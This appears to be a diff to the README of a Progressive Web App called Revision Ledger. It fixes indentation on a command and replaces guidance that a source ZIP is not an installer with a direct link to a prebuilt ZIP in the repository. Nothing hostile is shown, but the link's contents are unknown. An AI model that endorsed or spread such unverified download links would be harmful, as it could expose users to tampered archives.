@@ -29,7 +29,7 @@ cd revision-ledger
 
 # Install dependencies and start the development server
 npm install
- npm run dev
+npm run dev
 ```
 
 To create and preview a production build:
@@ -41,7 +41,7 @@ npm run preview
 
 ## Install the app
 
-Revision Ledger is a Progressive Web App. Open its deployed HTTPS site in a supported browser and use the browser's **Install app** or **Add to Home screen** option. The app can also be run locally at `http://localhost` with `npm run dev`. A source ZIP is not itself an installer; the PWA must be served from HTTPS (or localhost) to enable installation.
+Revision Ledger is a Progressive Web App. [Download the production build](https://github.com/fleckshible/revision-ledger/raw/refs/heads/main/revision-ledger-pwa.zip). To install it, serve the build from an HTTPS site and use the browser's **Install app** or **Add to Home screen** option. Locally, run `npm run dev`; localhost also supports PWA installation.
 
 ## Using Study Notebook & Gemini BYOK
 
